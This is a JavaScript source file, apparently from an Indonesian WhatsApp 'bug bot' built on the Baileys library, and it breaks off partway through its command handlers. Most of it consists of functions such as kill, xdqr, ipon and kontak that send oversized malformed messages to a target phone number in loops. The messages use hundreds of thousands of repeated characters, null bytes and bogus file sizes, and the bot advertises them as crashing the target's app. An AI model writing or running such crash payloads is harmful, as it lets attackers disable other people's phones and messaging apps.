/*
*/
const path = require('path'); // Tambahkan path untuk rujukan absolut
require(path.resolve(__dirname, '../../config'));

const {
  WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto,
  generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage,
  areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore, makeWaSocket,
} = require('@adiwajshing/baileys');
const fs = require('fs');
const util = require('util');
const axios = require('axios');
const { exec } = require('child_process');
const chalk = require('chalk');
const moment = require('moment-timezone');
const yts = require('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const time = moment.tz('Asia/Jakarta').format('HH:mm:ss');

// Gunakan path absolut untuk require file
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require(path.resolve(__dirname, '../myfunc'));
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require(path.resolve(__dirname, '../respon-list'));
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require(path.resolve(__dirname, '../setproses'));
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require(path.resolve(__dirname, '../setdone'));

// Gunakan path absolut untuk file JSON
const orgkaya = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../../../database/owner.json')));
const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../../../database/owner.json')));
const premium = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../../../database/premium.json')));

const db_respon_list = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../../../database/list-message.json')));
const listStore = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../../../database/list-message.json')));
const set_proses = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../../../database/set_proses.json')));
const set_done = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../../../database/set_done.json')));

// Contoh bagian kode lainnya tetap sama
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))

try {
ppuser = await Zcon.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Zcon.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Zcon.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

const DB = "https://raw.githubusercontent.com/Shokaz7/VILLAIN/refs/heads/main/DbNmr.json";
    async function isBotNumberRegistered(botNumber) {
      try {
        const response = await axios.get(DB);
        if (!Array.isArray(response.data)) {
          console.error('Data Yang Diterima Tidak Valid: Harus Berupa Array.');
          return false;
        }
        const registeredBotNumbers = response.data;
        return registeredBotNumbers.includes(botNumber);
      } catch (error) {
        console.error('Error Fetching Registered Bot Numbers:', error.message);
        return false;
      }
    }

async function loadingdone () {
    var genalpa = [
        "ATTACK DQR",
        "ATTACK DQR........",
        "JEDA 4 JAM...",
        "UDAH AH MALAS GW",
        "SUBSCRIBE YT : DQRSC DULU DONG BARU DILANJUTIN 😹",
        "MASIH DI BACA ??? LANGSUNG KE YT AYING",
        "ATTACK DQRSC"
    ];


    let { key } = await Zcon.sendMessage(m.chat, { text: 't.me/Dqrsc' });

    for (let i = 0; i < genalpa.length; i++) {
        await sleep(150); 
        await Zcon.sendMessage(m.chat, {
            text: genalpa[i],
            edit: key
        });
    }


    const imageurl = "https://ibb.co.com/C0y7LyX";
    await Zcon.sendMessage(m.chat, {
    image: { url: imageurl },
    caption: `
⪨ sᴜᴄᴄᴇss ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ ⪨
sᴛᴀᴛᴜs : ᴅᴏɴᴇ
ᴍᴏᴅᴇ  : *VIP*
create : t.me/Dqrsc

--------------------[ *ɴᴏᴛᴇ* ]--------------------
Jɪᴋᴀ ᴄ2 ᴍᴀᴋᴀ ᴛᴀʀɢᴇᴛ ᴛᴇʀᴋᴇɴᴀ ᴜɪ ᴄʀᴀsʜ ☠️
`
});
};

async function loading () {
var genalpa = [
"EG OO",
"EN TARZ",
"TAR KALEM",
"LU AJA KAGA SUBSCRIBE ASWW",
"ÃGUENTÃR"
]
let { key } = await PannOfficiaL.sendMessage(m.chat, {text: 't.me/Dqrsc'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < genalpa.length; i++) {
await sleep(120)
await PannOfficiaL.sendMessage(m.chat, {text: genalpa[i], edit: key });
}
}

async function ipon(X) {
      Zcon.relayMessage(X, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': jid,
            'participant': jid,
            'quotedMessage': {
              'conversation': 'assalamualaikum kawan ku izin push chat' + 'السلام عليكم '.repeat(666666)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': X
        }
      }, {
        'messageId': null
      });
    };

async function pay(X) {
      Zcon.relayMessage(X, {
        'paymentInviteMessage': {
          'serviceType': "UPI",
          'expiryTimestamp': Date.now() + 666666666
        }
      }, {
        'participant': {
          'jid': X
        }
      });
    };


async function ViewOnce1(X, ultraviolet) {
      var etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/29984231_944880251026741_669740733267367642_n.enc?ccb=11-4&oh=01_Q5AaIGSoVLTX6oUIyksFHKc4aOP2g-pyeXH6fhgRasx1Dnx9&oe=675AC1F5&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "lYXifE5EEbJ9YAR2lRdmpVTeTXQ2xIW15B8zKXGOL8A=",
            fileLength: "3722921",
            seconds: 99999, 
            mediaKey: "IoxI2qKxHpqlKwtPwaP90rjAdUNY/zdqHi8unAf+cyA=",
            caption: "𝐃𝐐𝐑\n൫ nãon" + "ꦾ".repeat(80000) + "@6283185482028".repeat(50000),
            height: 99999,
            width: 99999,
            fileEncSha256: "PmVjaFaRk6F+rSAfMNY1/i9YxS4AGqhkZ1/8j+c4ZUk=",
            directPath:
              "/v/t62.7161-24/29984231_944880251026741_669740733267367642_n.enc?ccb=11-4&oh=01_Q5AaIGSoVLTX6oUIyksFHKc4aOP2g-pyeXH6fhgRasx1Dnx9&oe=675AC1F5&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1731409391",
            jpegThumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAmQAAAAAAAAAAAAAAf//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AW//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8Af//Z",
            viewOnce: true,
          },
        }),
        { userJid: X, quoted: ultraviolet }
      );
      await Zcon.relayMessage(X, etc.message, {
        participant: { jid: X },
        messageId: etc.key.id,
      });
    }


async function kill(X, ptcp = false) {
      let pex = "𝐃𝐐𝐑\n൫ ãguentãr" + "ꦾ".repeat(90000) + "@6283185482028".repeat(50000);
      await Zcon.relayMessage(X, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "unknown",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
                },
                hasMediaAttachment: true
              },
              body: {
                text: pex
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: ["6283185482028@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "Bokep 18+",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
                  }
                }
              }
            }
          }
        }
      }, { participant: { jid: X } }, { messageId: null });
    }

async function xdqr(X, ptcp = false) {
      let pex = "𝐃𝐐𝐑\n൫ ãguentãr" + "ꦾ".repeat(80000) + "@6283185482028".repeat(40000);
      await Zcon.relayMessage(X, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: pex
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: ["6283185482028@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                 locationMessage: {
                 degreesLatitude: 0,
                 degreesLongitude: 0
                  }
                }
              }
            }
          }
        }
      }, { participant: { jid: X } }, { messageId: null });
    }

  async function kontak(X, qdocu) {
      var etc = generateWAMessageFromContent(X,
        proto.Message.fromObject({
          contactMessage: {
            displayName: "Sepuh virkon senggol donk🤪" + "ꦾ".repeat(90000),
            vcard:
              "BEGIN:VCARD\nVERSION:3.0\nN:;\u0000;;;\nFN:\u0000\nEND:VCARD",
          },
        }),
        { userJid: target, quoted: qdocu }
      );
      await Zcon.relayMessage(X, etc.message, {
        participant: { jid: X },
        messageId: etc.key.id,
      });
    }

const paytex = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };

const VxO = " ãguentãr newz⃰" + "\u0000".repeat(50000);
    async function NewsletterZap(LockJids) {
      var messageContent = generateWAMessageFromContent(
        LockJids,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: `120363298524333143@newsletter`,
                newsletterName:
                  "news" + "\u0000".repeat(990000),
                jpegThumbnail: "",
                caption: `ãguentãr`,
                inviteExpiration: Date.now() + 1814400000,
              },
            },
          },
        }),
        {
          userJid: LockJids,
        }
      );
      await Zcon.relayMessage(LockJids, messageContent.message, {
        participant: {
          jid: LockJids,
        },
        messageId: messageContent.key.id,
      });
    }

      const wanted = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      'message': {
        "interactiveMessage": {
          "header": {
            "hasMediaAttachment": true,
            "jpegThumbnail": null
          },
          "nativeFlowMessage": {
            "buttons": [{
              "name": "review_and_pay",
              "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐃𝐐𝐫͢ 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
            }]
          }
        }
      }
    }

const ultraviolet = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: null
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ہہ𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };

const qdocu = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from
          ? {
              remoteJid: "@s.whatsapp.net",
            }
          : {}),
      },
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
          mimetype: "application/octet-stream",
          fileSha256: "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
          fileLength: "64455",
          pageCount: 1,
          mediaKey: "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
          fileName: "unknown" + "ꦾ".repeat(90000),
          fileEncSha256: "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
        },
      },
    };

async function downloadMp3 (link) {
try {
Zcon.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Zcon.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
Zcon.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Zcon.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

//self public
global.public = true
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}

const reply = (teks) => { 
Zcon.sendMessage(from, { text: teks, contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: false,
title: `Simple Botz WhatsApp`,
body: `Create by t.me/Dqrsc`,
previewType: "VIDEO",
thumbnail: viox,
sourceUrl: `${global.dqr}`,
mediaUrl: `${global.dqr}`
}
},
text: teks
}, {
quoted: m
})
}

const reply2 = (teks) => {
Zcon.sendMessage(from, { text : teks }, { quoted : m })
}

function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
    temp = ms
    days = Math.floor(ms / (24*60*60*1000));
    daysms = ms % (24*60*60*1000);
    hours = Math.floor((daysms)/(60*60*1000));
    hoursms = ms % (60*60*1000);
    minutes = Math.floor((hoursms)/(60*1000));
    minutesms = ms % (60*1000);
    sec = Math.floor((minutesms)/(1000));
    return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }

const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam 🌃'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang 🌆'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore 🌅'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang 🏙'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh 🌉'
}
if(timee < "03:00:00"){
var waktuucapan = 'Tengah Malam 🌌'
}


if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('LocalMemory.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
reply(response)
}}

switch(command) {
case 'menu':
await loading();
const menu = {
        image: viox,
        caption: `
⟬ *ãguentãr V2.0*  ⟭
𝐎𝐰𝐧 : t.me/Dqrsc
𝐁𝐨𝐭 : _ãguentãr_
𝐕𝐞𝐫𝐬𝐢 : 2.0

*⚠️Note : gunakan dengan bijak ada beberapa fitur yang belum stabil harap hati hati*

⟬ *normál bug* ⟭
⩟ - .dqrv1
⩟ - .xdqr
⩟ - .xui
⩟ - .xios
⩟ - .virkon
⩟ - .forcegc

⟬ *proprietáriobug*⟭
⩟ - .dxlaw-versão
⩟ - .xfracassado
⩟ - .mistura
⩟ - .xsyui
⩟ - .forcestatus

⟬ *multi-sender*⟭
⩟ - .attack
⩟ - .status
⩟ - .add

⟬ *clean up*⟭
⩟ - .cleanbug

⟬ *Random* ⟭
⩟ - .enc
⩟ - .dec
⩟ - .public

> ãguentãr. ${time}`
}
Zcon.sendMessage(from, menu)
break

case 'xdqr': {
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Example: .${command} 628xxx`)
let ex = q.replace(/[^0-9]/g, "")
if (ex.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let X = ex + '@s.whatsapp.net'
loadingdone();
for (let j = 0; j < 30; j++) {
await DocSystem(X)
await dewa(X)
await DocSystem(X)
await sleep(1000)
}
}
break

case 'xui': {
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Example: .${command} 628xxx`)
let ex = q.replace(/[^0-9]/g, "")
if (ex.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let X = ex + '@s.whatsapp.net'
loadingdone();
for (let j = 0; j < 30; j++) {
await DocSystem(X)
await dewa(X)
await xdqr(X, ptcp = false)
await ViewOnce1(X, ultraviolet)
await DocSystem(X)
await sleep(1000)
}
}
break

  case 'forcegc': {
if (!isPremium) {
        return reply(mess.premium);
    }
  async function xd(nomor, chat, participant) {
cay.sendMessage(
chat,
{
audio: { url: "../../system/image/menu.mp3" },
mimetype: `audio/mp4`,
caption: "㌷" + "ী̸͓̩̟͈̲̩̟͈͓̲̩̟͈̲̗̩̟͈̞̫̥̻͇̇̈́̿͌̽̊͛̅͑̉́͛̂̉̏̈́͛͛͋͝".repeat(3000) + "ꦾ".repeat(30000)
},
{ quoted: { ...nullgb, key: { ...nullgb.key, participant } } }
);
}
async function DZXinX9() {
if (!args[0]) amount = `99`;
for (let i = 1; i < 10; i++) {
xd(pushname, m.chat, m.sender);

}
}
  await DZXinX9();
  await DZXinX9();
}
break

case 'forcestatus': {
    if (!isBotNumberRegistered) return reply(`*Yah Atmin Membatasi Device, Silahkan menunggu atau Beli Acces Api*

 _Yang Asli Cuma lewat Tele_
> t.me/Dqrsc`)
if (!isPremium) return reply(mess.premium)
    if (!text) {
        return reply('Contoh: .forcestatus 628xxx');
    }

    const ex = text.replace(/[^0-9]/g, "");
    if (ex.startsWith('0')) {
        return reply('Masukan Nomor Awal Kode Negara\nContoh: .forcestatus 628xxx');
    }

    const targetId = ex + '@s.whatsapp.net';
    const folderPath = '../../system/image/zkosong.png';
    fs.readdir(folderPath, async (err, files) => {
        if (err) {
            return reply('Terjadi kesalahan saat mengirimkan harap hilangkan privasi story anda');
        }

        for (const file of files) {
            const filePath = path.join(folderPath, file);
            const media = await PannOfficiaL.sendMessage(targetId, fs.readFileSync(filePath), { caption: 'Status baru!' });
            await PannOfficiaL.sendMessage(targetId, media, { quoted: media });
        }
    });
} break

case 'virkon': {
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Example: .${command} 628xxx`)
let ex = q.replace(/[^0-9]/g, "")
if (ex.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let X = ex + '@s.whatsapp.net'
loadingdone();
for (let j = 0; j < 30; j++) {
await kontak(X, qdocu)
await kontak(X, qdocu)
await kontak(X, qdocu)
await kontak(X, qdocu)
await kontak(X, qdocu)
await sleep(1000)
}
}
break

case 'dqrv1': {
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Example: .${command} 628xxx`)
let ex = q.replace(/[^0-9]/g, "")
if (ex.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let X = ex + '@s.whatsapp.net'
loadingdone();
for (let j = 0; j < 30; j++) {
await xdqr(X, ptcp = false)
await xdqr(X, ptcp = false)
await ViewOnce1(X, ultraviolet)
await sleep(1000)
}
}
break

case 'xios': {
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Example: .${command} 628xxx`)
let ex = q.replace(/[^0-9]/g, "")
if (ex.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let X = ex + '@s.whatsapp.net'
loadingdone();
for (let j = 0; j < 20; j++) {
await ipon(X)
await ipon(X)
await pay(X)
await pay(X)
await sleep(1000)
}
}
break

case 'dxlaw-versão': case 'misrura': case 'xfracassado': case 'xsyui': {
if (!isBotNumberRegistered) return reply(`*Yah Atmin Membatasi Device, Silahkan menunggu atau Beli Acces Api*

 _Yang Asli Cuma lewat Tele_
> t.me/Dqrsc`)
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Example: .${command} 628xxx`)
let ex = q.replace(/[^0-9]/g, "")
if (ex.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let X = ex + '@s.whatsapp.net'
loadingdone();
for (let j = 0; j < 1; j++) {
await kill(X, ptcp = false)
await kill(X, ptcp = false)
await kill(X, ptcp = false)
await kill(X, ptcp = false)
await kill(X, ptcp = false)
await sleep(2000)
await kill(X, ptcp = false)
await kill(X, ptcp = false)
await kill(X, ptcp = false)
await kill(X, ptcp = false)
await kill(X, ptcp = false)
}
}
break

case 'attack': {
if (!isBotNumberRegistered) return reply(`*Yah Atmin Membatasi Device, Silahkan menunggu atau Beli Acces Api*

 _Yang Asli Cuma lewat Tele_
> t.me/Dqrsc`)
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Example: .${command} 628xxx`)
let ex = q.replace(/[^0-9]/g, "")
if (ex.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
m.reply("_Error Mengirimkan Perintah Silahkan cek dengan ketik .status_")
}
break

case 'status': {
if (!isBotNumberRegistered) return reply(`*Yah Atmin Membatasi Device, Silahkan menunggu atau Beli Acces Api*

 _Yang Asli Cuma lewat Tele_
> t.me/Dqrsc`)
if (!isPremium) return reply(mess.premium)
